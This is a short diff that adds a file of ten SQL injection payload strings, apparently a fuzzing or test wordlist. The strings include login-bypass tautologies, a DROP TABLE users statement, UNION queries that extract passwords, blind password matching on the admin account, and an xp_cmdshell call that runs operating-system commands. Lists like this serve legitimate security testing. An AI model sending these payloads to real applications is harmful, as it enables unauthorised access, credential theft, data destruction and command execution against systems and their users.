@@ -1,0 +1,10 @@
+' OR '1'='1
+'; DROP TABLE users; --
+admin' --
+' UNION SELECT * FROM passwords --
+1' AND (SELECT * FROM users WHERE username='admin' AND password LIKE '%')--
+' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%')--
+'; EXEC xp_cmdshell('dir'); --
+' UNION SELECT NULL, version() --
+' OR '1'='1' /*
+*/ UNION SELECT password FROM users WHERE '1'='1
